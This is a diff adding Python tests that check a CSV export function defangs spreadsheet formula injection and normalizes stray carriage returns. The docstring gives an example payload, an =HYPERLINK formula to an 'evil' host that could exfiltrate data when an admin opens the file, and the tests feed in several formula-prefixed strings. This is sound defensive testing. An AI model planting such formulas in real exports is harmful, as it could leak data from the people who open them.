@@ -328,3 +328,50 @@ def test_stream_jsonl_emits_null_when_user_id_missing():
     obj = json.loads(lines[0])
     assert obj["annotation"]["last_editor"] is None
     assert obj["annotation"]["completed_by"] is None
+
+
+# ---------------- CSV formula-injection guard ----------------
+
+
+def test_stream_csv_rows_defangs_formula_injection_prefix():
+    """Cells starting with =, +, -, @, \\t, \\r get a leading single quote.
+    Excel / Sheets would otherwise auto-execute the cell when the file is
+    opened — an annotator typing `=HYPERLINK(\"https://evil\",\"x\")` into
+    source_text could exfiltrate via an admin's open."""
+    import csv
+    import io
+    from backend.exports.service import stream_csv_rows
+    for payload in ("=HYPERLINK(\"x\",\"y\")", "+1+1", "-1+1", "@SUM(A1)"):
+        row = _fake_row(ref_source_text=payload)
+        chunks = list(stream_csv_rows(iter([row])))
+        # Parse the data row back through csv to recover the actual
+        # cell value (csv doubles inner quotes on write).
+        data_row = next(csv.reader(io.StringIO(chunks[1])))
+        # ref_source_text is the last CSV column.
+        assert data_row[-1] == "'" + payload, (
+            f"expected single-quote-prefixed payload, got {data_row[-1]!r}"
+        )
+
+
+def test_stream_csv_rows_normalizes_lone_carriage_return():
+    """Bare \\r in source_text confuses Excel-for-macOS into treating it
+    as a row break inside a quoted field. Strip down to \\n."""
+    from backend.exports.service import stream_csv_rows
+    row = _fake_row(ref_source_text="line1\rline2")
+    chunks = list(stream_csv_rows(iter([row])))
+    data = chunks[1]
+    # The data row must contain "line1\nline2" inside a quoted cell.
+    # No raw \r should survive in the payload region (the \r\n terminator
+    # of the csv row is OK — that's the row delimiter, not the cell).
+    payload_region = data.rsplit("\r\n", 1)[0]
+    assert "line1\nline2" in payload_region
+    assert "line1\rline2" not in payload_region
+
+
+def test_stream_csv_rows_passes_safe_text_unchanged():
+    """Normal Turkish text doesn't gain a quote prefix and doesn't drop chars."""
+    from backend.exports.service import stream_csv_rows
+    row = _fake_row(ref_source_text="madde 30 fıkra 2 bent a")
+    chunks = list(stream_csv_rows(iter([row])))
+    assert "madde 30 fıkra 2 bent a" in chunks[1]
+    assert "'madde" not in chunks[1]
